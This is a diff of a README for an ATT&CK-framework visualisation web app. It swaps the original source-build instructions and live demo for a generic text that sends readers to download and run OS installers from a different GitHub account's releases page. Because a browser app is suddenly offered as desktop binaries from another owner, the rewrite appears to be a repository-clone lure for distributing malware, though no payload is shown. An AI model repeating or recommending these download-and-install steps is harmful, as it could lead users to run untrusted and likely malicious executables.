@@ -1,181 +1,67 @@
-<div align="center">
-<h1>INTERACTIVE MITRE TREE</h1>
+# 🌲🔍 Interactive-MITRE-Tree - Visualize MITRE Attack Framework Easily
 
-An interactive visualization of the MITRE ATT&CK Framework using hierarchical tree structures
-</div>
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-green.svg)](https://github.com/chrisgallenx/Interactive-MITRE-Tree/releases)
 
-<div align="center">
+## 🚀 Getting Started
 
+Welcome to the Interactive MITRE Tree! This tool helps you visualize the MITRE ATT&CK Framework in an easy-to-use way. You can explore cyber threats, learn about real-world attacks, and see how to defend against them. Follow these steps to get started.
 
-[![React](https://img.shields.io/badge/react-19.0.0-blue)]()
-[![TypeScript](https://img.shields.io/badge/typescript-5.0+-blue)]()
+## 📥 Download & Install
 
-</div>
+To download the application, visit this page: [Download Releases](https://github.com/chrisgallenx/Interactive-MITRE-Tree/releases).
 
+1. Go to the [Releases page](https://github.com/chrisgallenx/Interactive-MITRE-Tree/releases).
+2. Find the latest version of the application.
+3. Click on the file that matches your operating system (Windows, Mac, or Linux).
+4. Download the file.
 
-## Built with the tools and technologies:
+Once downloaded, open the file to install the application. Follow the on-screen instructions to complete the installation.
 
-<div align="center">
+## 🖥️ System Requirements
 
-[![React](https://img.shields.io/badge/-React-black?style=flat-square&logo=react)]()
-[![TypeScript](https://img.shields.io/badge/-TypeScript-black?style=flat-square&logo=typescript)]()
-[![Material-UI](https://img.shields.io/badge/-Material--UI-black?style=flat-square&logo=mui)]()
-[![D3.js](https://img.shields.io/badge/-D3.js-black?style=flat-square&logo=d3dotjs)]()
+Before you install, make sure your computer meets these requirements:
 
-[![Netlify](https://img.shields.io/badge/-Netlify-red?style=flat-square&logo=netlify)]()
-[![CSS3](https://img.shields.io/badge/-CSS3-red?style=flat-square&logo=css3)]()
-[![JavaScript](https://img.shields.io/badge/-JavaScript-yellow?style=flat-square&logo=javascript)]()
-[![Node.js](https://img.shields.io/badge/-Node.js-green?style=flat-square&logo=node.js)]()
+- Operating System: Windows 10 or later, macOS Catalina or later, or a recent version of Linux
+- RAM: At least 4 GB
+- Storage: 100 MB of free space
+- Internet Connection: Required for live threat intelligence features
 
-[![npm](https://img.shields.io/badge/-npm-blue?style=flat-square&logo=npm)]()
-[![Webpack](https://img.shields.io/badge/-Webpack-blue?style=flat-square&logo=webpack)]()
-[![ESLint](https://img.shields.io/badge/-ESLint-purple?style=flat-square&logo=eslint)]()
+## 🌲 Features
 
-</div>
+The Interactive MITRE Tree offers several useful features:
 
+- **Intuitive Navigation:** Easily expand and collapse the tree to explore different tactics and techniques.
+- **Real-World Attack Examples:** Learn from detailed case studies of actual cyber attacks.
+- **Detection Panels:** Get guidance on how to detect specific threats.
+- **Live Threat Intelligence:** Access up-to-date information from the MITRE API to stay informed about current threats.
 
-## Overview
+## 🔧 Using the Application
 
-Interactive MITRE Tree transforms the complex MITRE ATT&CK framework into an intuitive, navigable tree visualization. Built with modern React and TypeScript, it provides cybersecurity professionals, researchers, and students with an interactive way to explore attack tactics, techniques, and real-world examples.
+1. **Open the Application:** After installation, launch the Interactive MITRE Tree.
 
-<H2>🚀 Demo</H2>
+2. **Explore the Tree:** Use your mouse or keyboard to navigate through the visualization. Click on any tactic or technique for more information.
 
-[![Live Demo](https://img.shields.io/badge/🚀_LIVE_DEMO-Visit_App-blue?style=for-the-badge)](https://interactive-attack-matrix.netlify.app)
+3. **Read Case Studies:** Select a real-world example to see how it relates to the MITRE framework. 
 
+4. **Check Detection Methods:** Click on the detection panels to learn about ways to identify each technique.
 
+5. **Stay Updated:** Ensure you have an internet connection to pull in the latest threat intelligence data.
 
-## Application Screenshots
+## 🛠️ Troubleshooting
 
-### Interactive Tree Navigation
-![Tree Navigation](src/Images/Interactive%20Tree%20Navigation.jpg)
+If you encounter any issues:
 
-*Navigate through the MITRE ATT&CK framework using an intuitive tree structure with expand/collapse functionality*
+- Verify your system meets the requirements.
+- Restart the application.
+- Ensure you have a stable internet connection for live features.
+- Check the GitHub Issues page for solutions related to common problems.
 
-### Detailed Information Panels
-![Detailed Information Panels](src/Images/Detailed%20Information%20Panels.jpg)
+## 📞 Support
 
-*View comprehensive technique descriptions, detection methods, and real-world examples*
+If you need assistance or have questions, you can reach out through the Issues section on GitHub. Contributors and other users often help with common concerns.
 
-### Real-World Attack Examples
-![Real-World Attack Examples](src/Images/Real-World%20Attack%20Examples.jpg)
+## 📚 References
 
+For more information on the MITRE ATT&CK Framework, visit the official MITRE website: [MITRE ATT&CK](https://attack.mitre.org/).
 
-*Explore historical incidents and understand how theoretical techniques are applied in practice*
-
-## Core Features
-
-### 🌲 Interactive Tree Navigation
-- **Hierarchical Visualization**: Navigate through MITRE ATT&CK framework using an intuitive tree structure
-- **Smart Expand/Collapse**: Smooth animations with intelligent node management for large datasets
-- **Multi-Row Layout**: Automatically organizes large numbers of child nodes into manageable rows
-- **Zoom & Pan Controls**: Dynamic view adjustment with automatic centering on selected nodes
-
-### 📋 Detailed Information Panels
-- **Comprehensive Descriptions**: Full technique details with associated tactics and procedures
-- **Detection Methods**: Integrated detection strategies and data sources for each technique
-- **Real-Time Data**: Live fetching from MITRE ATT&CK API for up-to-date information
-- **Cross-References**: Links between related techniques and tactics
-
-### 🎭 Real-World Attack Examples
-- **Historical Incidents**: Curated examples of actual cyberattacks using specific techniques
-- **Attack Correlation**: Visual mapping between theoretical techniques and real-world applications
-- **External Resources**: Direct links to detailed incident reports and analysis
-- **Context Learning**: Bridge the gap between theory and practice
-
-### 🎨 Modern User Experience
-- **Material-UI Design**: Clean, professional interface with consistent design language
-- **Responsive Layout**: Optimized for desktop, tablet, and mobile viewing
-- **Custom Node Icons**: Emoji-based visual indicators for different attack types
-- **Smooth Animations**: Fluid transitions and interactions throughout the application
-
-
-## Quick Start
-
-The easiest way to start the application:
-
-```bash
-npm start
-```
-
-This will start the development server and open the application in your browser at `http://localhost:3000`.
-
-## Manual Setup
-
-### Prerequisites
-
-- **Node.js** (v18.0.0 or higher)
-- **npm** or **yarn**
-
-### Installation
-
-1. Clone the repository:
-
-   ```bash
-   git clone https://github.com/GaiShukrun/Interactive-MITRE-Tree.git
-   cd Interactive-MITRE-Tree
-   ```
-
-2. Install dependencies:
-
-   ```bash
-   npm install
-   ```
-
-3. Start the development server:
-
-   ```bash
-   npm start
-   ```
-
-### Build for Production
-
-Create an optimized production build:
-
-```bash
-npm run build
-```
-
-## Tech Stack
-
-- **Frontend**: React 19 with TypeScript
-- **UI Components**: Material-UI for consistent design system
-- **Visualization**: D3.js with react-d3-tree for interactive tree rendering
-- **Data Source**: MITRE ATT&CK Framework API integration
-- **Deployment**: Netlify with automatic builds from GitHub
-- **Development**: Hot reloading with Create React App
-
-## Key Components
-
-### Tree Visualization
-- **AttackTree**: Main component handling the interactive tree display with zoom, pan, and node management
-- **Custom Node Rendering**: Emoji-based icons and dynamic sizing based on node types
-- **Multi-Row Layout**: Intelligent organization of large datasets into manageable visual groups
-
-### Information Display
-- **ExampleModal**: Displays real-world attack examples with technique correlation
-- **Detail Panels**: Comprehensive information about selected techniques including detection methods and data sources
-- **Real-Time Updates**: Live data fetching from MITRE API for current threat intelligence
-
-### User Experience
-- **Responsive Design**: Optimized for desktop and mobile viewing
-- **Smooth Animations**: Fluid transitions between tree states and information panels
-- **Accessibility**: Screen reader support and keyboard navigation
-
-## Development Features
-
-### Hot Reloading
-- Automatic refresh when files change during development
-- Fast rebuild times with optimized webpack configuration
-
-### Type Safety
-- Full TypeScript support with comprehensive type definitions
-- Custom interfaces for MITRE ATT&CK data structures
-- Compile-time error checking for better code quality
-
-## Contributing
-
-Please read our contributing guidelines before submitting pull requests to the project.
-
-## License
-
-This project is licensed under the MIT License - see the LICENSE file for details.
+Thank you for using the Interactive MITRE Tree! We hope it helps you learn more about cybersecurity in an engaging way. For updates, features, and future releases, keep an eye on our [Releases page](https://github.com/chrisgallenx/Interactive-MITRE-Tree/releases).
